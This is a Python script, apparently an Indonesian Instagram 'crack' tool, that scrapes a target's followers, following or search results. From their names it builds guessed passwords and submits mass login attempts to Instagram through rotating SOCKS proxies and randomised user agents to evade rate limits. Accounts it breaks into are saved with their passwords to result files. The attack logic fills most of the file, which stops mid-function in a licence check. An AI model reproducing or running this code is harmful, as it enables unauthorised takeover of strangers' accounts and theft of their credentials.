try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,bs4,json,os,sys,random,datetime,time,re,subprocess
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich import print as printer
from rich.console import Console
from rich.console import Console as sol
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
def folder():
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('result')
	except:pass

try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')    
prox=open('.prox.txt','r').read().splitlines()
try:
	os.system('curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txt')
except:
	pass
sock=open('socks5.txt','r').read().splitlines()
CY='\033[96;1m'
MG='\033[1;35m' #MAGENTA
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
B = '\33[1;96m' # BIRU -
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU

H3 = "#000000" # Hitam
M3 = "#FF0000" # Merah
I3 = "#00FF00" # Hijau
K3 = "#FFFF00" # Kuning
B3 = "#00C8FF" # Biru
U3 = "#AF00FF" # Ungu
P3 = "#FF00FF" # Pink
C3 = "#00FFFF" # Biru Muda
Q3 = "#FFFFFF" # Putih
J3 = "#FF8F00" # Jingga
A3 = "#AAAAAA" # Abu-Ab
O3 = "#FFA500" # OREN

HH = "[#000000]" # Hitam
MM = "[#FF0000]" # Merah
II = "[#00FF00]" # Hijau
KK = "[#FFFF00]" # Kuning
BB = "[#00C8FF]" # Biru
UU = "[#AF00FF]" # Ungu
PP = "[#FF00FF]" # Pink
CC = "[#00FFFF]" # Biru Muda
QQ = "[#FFFFFF]" # Putih
JJ = "[#FF8F00]" # Jingga
AA = "[#AAAAAA]" # Abu-Abu
OO = "[#FFA500]" # OREN
USN="Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; MITO A68 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.6.2.599 U3/0.8.0 Mobile Safari/534.30 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
# USN="Mozilla/5.0 (Linux; Android 11; ASUS_I006D Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 Sleipnir/3.5.28"
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()
ua=open('ua.txt','r').read().splitlines()
# CLEAR
def clear():
    os.system('clear')
# CLEAR
def clear():
	os.system('clear')
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03)
		
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow

	 
# BANNER
def banner():
	clear()
	prints(Panel(""" [deep_pink3]
[deep_pink3] ___  ________  ___     
[deep_pink3]|\  \|\   ____\|\  \        [bold green] PENGEMBANGAN : Lukman[white]
[deep_pink3]\ \  \ \  \___|\ \  \       [bold green] GITHUB       : github.com/LukmanXD[white]
[deep_pink3] \ \  \ \  \  __\ \  \      [bold green] WA           : [white]
 [deep_pink3] \ \  \ \  \|\  \ \  \____ [bold green] TEAM         : Lukman[white]
   [deep_pink3]\ \__\ \_______\ \_______\	
   
                             """, title=f"{waktu()}" , subtitle="[on cyan] Version 5.0"))

def loading():

    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r {N}[{H}•{N}] {H}Harap Tunggu...{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")		

try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus


def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user

def ANJIM():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            print('')
            prints(Panel(f"""[white][[red]01[white]] Login Menggunakan Cookie [white]([green]on[white])\n[white][[red]02[white]] Login Menggunakan Username & Password [white]([red]of[white])""", title='[on cyan][bold green]•Pilih Metode Login•[white]'))
            loginpil=input(f"  {P}[{M}•{P}] Pilihan 1 sampai 2 : {N}")
            if loginpil=='1':
                cetak(nel(f"""[white][[red]•[white]] Gunakan username dan cookies instagram untuk login.\n[white][[red]•[white]] sebelum login pastikan akun bersifat publik bukan privat"""))
                us=input(f'  {P}[{M}•{P}] Masukan Username : {N}')

                cok=input(f'  {P}[{M}•{P}] Masukan Cookie : {N}')
                loading()
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us);exit()
                os.system('python run.py')
            elif loginpil == '2':
                login()

        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
        
def login():
    global external
    try:
        cetak(nel(f"""[white][[red]•[white]] Gunakan username dan password instagram untuk login.\n[white][[red]•[white]] sebelum login pastikan akun bersifat publik bukan privat""")) 
        us=input(f"  {P}[{M}•{P}] Masukan username: {N}")
        pw=stdiomask.getpass(prompt=f'{P}[{M}•{P}] Masukan password: {N}')
    except KeyboardInterrupt:
        print('{M} KeyboardInterrupt terdeteksi... keluar{N}!!!')
        exit()
        
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n {H} nice Login berhasil{N}')
        os.system('python run.py')
    elif x.get('status')=='checkpoint':
        print(f'\t{M}login check point{N}')
        login()
    else:
        print(f' {M}user name atau passboard yang anda masukan salah{N}')
        login()

class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
        
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            print('')
            prints(Panel(f"""[white][[red]•[white]] [yellow]Selamat Datang : {nama}\n[white][[red]•[white]] [yellow]Username       : {self.username}\n[white][[red]•[white]] [yellow]Followers      : {followers}\n[white][[red]•[white]][yellow] Following      : {following}""", title='[on cyan][bold green]•Informasi Tumbal•[white]'))
            prints(Panel('[white][[red]01[white]] [blue]Crack Dari Pencarian\t[white][[red]02[white]] [blue]Crack Dari Pengikut\n[white][[red]03[white]] [blue]Crack dari Mengikuti\t[white][[red]04[white]][blue] Check Status Crack \n[white][[red]05[white]] [blue]Lihat Hasil Crack\t        [white][[red]06[white]] [blue]Exit' ,title='[on cyan][bold green]•Menu Anjing•[white]'))
                    
# HAPUS COOKIES 
    def Exit(self):
        x=input(f'  {P}[{M}•{P}] Apakah Yakin Mau Logut  y/t : {C}')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            os.system('python run.py')
        elif x in ('t','T'):
            os.system('python run.py')
        else:
            self.Exit()

# SIX API BUAT COLI            
    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3613812772602163&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid
        
# UNFOLLOW UNTUK LO BABI        
    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})
        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})
        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
  
# UNTUK PENCARIAN      
    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rrank_token=0.35875757839675004&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal
        
# UNTUK MENGUMPULKN ID
    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}[!] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()
        
# UNTUK SAYANG KU HAHAH
    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                print(f'  {P}[{M}•{P}] Tungu Sedang Mengumpulkan Id...')
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'\n>> Koneksi Internet Bermasalah{C}')
            except Exception as e:
                print(f'>> Username Yang Anda Masukan Tidak Di Temukan{C}')
            return internal
        else:lisensi()
        
    def passwordAPI(self,xnx):
        print(f'  {P}[{M}•{P}] Total Id : {H}{len(internal)}{N}')
        cetak(nel(f"""[white][[red]01[white]] Metode Cepat\n[white][[red]02[white]] Metode (OK only)\n[white][[red]03[white]] Metode Cepet (CP Only)\n[white][[red]04[white]] Metode 2 (CP Only""",title='Di Sarankan Pilih Metode NO 1'))
        c=input(f'  {P}[{M}•{P}] Masukan Pilihan : {N}')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            print(f'paswoard manual')
            print(f'{M} Contoh sayang,anjing,bangsat,kontol,babi')
            print('')
            zx=input(f'>> List Password : {H} {N}')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)
            
# BENTAR LAGI PERANG
    def generateAPI(self,user,o,zx=''):
        cetak(nel(f"""[white][[red]•[white]] Hasil [green]Ok[white] Akan Di Simpan Ke : [green]result {day}.txt[white]\n[white][[red]•[white]] Hasil [yellow]Cp[white] Akan Di simpan Ke : [yellow]result {day}.txt[white]""",subtitle="ON OFF Mode Pesawat Di ID 500/1000"))
        print("")
        with ThreadPoolExecutor(max_workers=15) as shinkai:
                for i in user:
                    try:
                        username=i.split("|")[0]
                        password=i.split("|")[1].lower()
                        for w in password.split(" "):
                            if len(w)<3:
                                continue
                            else:
                                w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                    except:
                        pass
        print('\n')
        oi='# CRACK SELESAI'
        io=mark(oi,style='yellow')
        sol().print(io)
        exit()
        
# MULAI PERANG
    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass
            
        return nama,pengikut,mengikut,postingan
        
# PERANG NYA SERU
    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        sys.stdout.write(f"\r{CY}[IGL] [{K}{loop}/{len(internal)}{C}] {H}[ SUKSES : {len(success)}]{C}  {K}[ CHEKPOINT : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks4://'+nip}
                aa='Mozilla/5.0 (Linux; Android'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='GT-I9500 Build/'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/537.36 Instagram 33.0.0.11.92 Android (21/5.0.1; 480dpi; 1080x1920; samsung; GT-I9500; ja3g; universal5410; en_US'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=s.get('https://www.instagram.com/accounts/login/?next=/accounts/logout/')
                headers = {
                    'Host': 'www.instagram.com',
                    'x-ig-www-claim': '0',
					'x-instagram-ajax': '1005633336-hot',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*',
					'x-requested-with': 'XMLHttpRequest',
					'x-asbd-id': '198387',
					'user-agent': uaku,
					'x-csrftoken': token.cookies['csrftoken'],
					'x-ig-app-id': '1217981644879628',
					'origin': 'https://www.instagram.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://www.instagram.com/accounts/login/?next=/accounts/logout/',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                }
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),


                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "optIntoOneTap": 'false',
                    "queryParams": "{}",
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    oi = nel(io, style='green')
                    print('\n')
                    cetak(nel(oi, title=' •SUKSES LUKMAN•'))
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    success.append(user)
                    break
                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    o=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
                    print('\n')
                    oi=nel(io,style='white')
                    cetak(nel(oi, title=' SORRY ANDA BELUM BERUNTUNG '))
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break
                    
                elif 'Please wait a few minutes' in str(x.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}IP KENA SPAM TUNGGU BEBERAPA MENIT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
                elif 'ip_block' in str(x.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}IP DI BLOKIR ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
                    self.crackAPI(user,pas)
                elif 'spam' in str(x.text):
                    sys.stdout.write(f"\r[{U}!{C}] {U}TERDETEKSI SPAM ON OFF MODE PESAWAT{C}");sys.stdout.flush();sleep(0)
#					self.crackAPI(user,pas)
                else:
                    continue
            loop+=1
        except:
            self.crackAPI(user,pas)

# PERANG KE DUA
    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': USN,
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                print(f"\r{P}╭──{H} Successfully{C}                             ")
                print(f"{P}├──{P} Nama     : {H}{nama}\n{P}├──{P} Username : {H}{user}\n{P}├──{P} Password : {H}{pw}\n{P}├──{P} Pengikut : {H}{pengikut}\n{P}├──{P} Mengikuti: {H}{mengikut}\n{P}├──{P} Postingan: {H}{postingan}\n{P}╰──{P} User Agent : {H}{uaku}{C}")
                print('\n')
            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                print(f"\r{P}╭──{K} Check Point{C}                       ")
                print(f"{P}├──{P} Nama     : {K}{nama}\n{P}├──{P} Username : {K}{user}\n{P}├──{P} Password : {K}{pw}\n{P}├──{P} Pengikut : {K}{pengikut}\n{P}├──{P} Mengikuti: {K}{mengikut}\n{P}╰──{P} Postingan: {K}{postingan}{C}")
                print('\n')
            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)
            
# PILIHAN MENU
    def menu(self):
        self.logo()
        c=input(f'  {P}[{M}•{P}] Pilih : {C}')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            cetak(nel(f"""[white][[red]•[white]] Masukan jumlah target"""))
            m=int(input(f'  {P}[{M}•{P}] Jumlah : {C}'));print('')
            cetak(nel(f"""[white][[red]•[white]] Masukan nama ranfom untuk di searching"""))
            for i in range(m):
                i+1
                nama=input(f'  {P}[{M}•{P}] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)
        elif c in ('2','02'):
            print('')
            mas=input(f'  {P}[{M}•{P}] Apakah anda ingin crack masal? y/t{C} ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')
        elif c in ('3','03'):
            print('')
            mas=input('  {P}[{M}•{P}] Apakah anda ingin crack masal? y/t ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('ISI JANGAN KOSONG KENTOD!')
        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'  {P}[{M}•{P}] Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'  {P}[{M}•{P}] Total Result Akun Check Point {H}{len(g)}{C}')
            print(f'\n{CY}[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n{K} proses check selesai...{C}')
        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f' [{U}>{C}] {i}')
            c=input(f'  {P}[{M}•{P}] Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'\n{K}[>] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""
 [{M}+{C}] {M}CHACK POINT{C}:
  {M}├╴>{C} Username: {O}{usr}{C}
  {M}├╴>{C} Password: {O}{pwd}{C}
  {M}├╴>{C} Followers: {O}{fol}{C}
  {M}├╴>{C} Following: {O}{ful}{C}
                    """);sleep(0.05)
                else:
                    print(f"""
  {H}[>]{C}{H} AKUN LIVE {C}
  {H}[>]{C}{H} Username : {H}{usr}{C}
  {H}[>]{C}{H} Password : {H}{pwd}{C}
  {H}[>]{C}{H} Pengikut : {H}{fol}{C}
  {H}[>]{C}{H} Mengikuti : {H}{ful}{C}

                    """);sleep(0.05)
                                       
        elif c in ('06','6'):
            self.Exit()
        else:
            exit()     
		
def mengi(self):
            try:
                menudump.append('pengikut')
                cetak(nel(f"""[white][[red]•[white]] Target Harus Bersipat Publick"""))
                m=int(input(f'  {P}[{M}•{P}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                print(f'  {P}[{M}•{P}] Total Id :{len(internal)}')
                nama=input(f'  {P}[{M}•{P}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    cetak(nel(f"""[white][[red]•[white]] Target Harus Bersipat Publick"""))
    m=input(f'  {P}[{M}•{P}] Username target : {C}')
    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                cetak(nel(f"""[white][[red]•[white]] Target harus bersifat publik jangan privat"""))
                m=int(input(f'  {P}[{M}•{P}] Masukan jumlah target: {N}'))
            except:m=1
            for t in range(m):
                t +=1
                print('')
                nama=input(f'  {P}[{M}•{P}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

def massal(self):
            menudump.append('pengikut')
            cetak(nel(f"""[white][[red]•[white]] Target Harus Bersipat Publik """))
            m=input(f'  {P}[{M}•{P}] Username target : {C}')
            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

def tlisensi():
    banner()
    top = f"""01
02
00"""
    tip = f"""Masukan Lisensi
Beli Lisensi
Log Out """
    lpp = f"""{II}ON
{II}ON
{II}ON"""
    tod = me()
    tod.add_column("NO", style=K3, justify='center')
    tod.add_column("PILIHAN", style=Q3, justify='center',width=60)
    tod.add_column("STATUS", style=M3, justify='center')
    tod.add_row(top,tip, lpp)
    sol().print(tod, justify='center')
    api = input(f" {N}input choice : ")
    if api in["1","01"]:
        prints(Panel(f"""{H}enter the apikey you have, if not, please buy by selecting number 2""",width=80,style=f"green"))
        key = input(f" {N}input apikey : {H}")
        open('data/lisen.txt','w').write(key)
        lisensi()
    elif api in["2","02"]:
        os.system("xdg-open https://wa.me/6283115893229?text=assalamualaikum,+bang+me+want+buy+license")
        sleep(2);tlisensi()       
    else:    
        exit()


def chet():
	os.system("xdg-open https://wa.me/6283177547834?text=assalamualaikum,+bang+me+Maut+buy+license")


def lisensi():
    try:
        cek=open('data/lisen.txt').read()
        lisensikuni.append(cek)
    except:
        tlisensi()
    ses=requests.Session()
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyNDk4MDE4MSIsInY5TnZpcDVuWnlGSkh2WnJ0eW1iMHp6NzgwN0NrVWhHd3NmZGlCMXIiXQ==&ProductId=16486&Key='+lisensikuni[0]).json()
    status=res['licenseKey']['key']
    if status ==cek:
        banner()
        wel='# LICENSE APPLICABLE '
        wel2 = mark(wel, style='green')
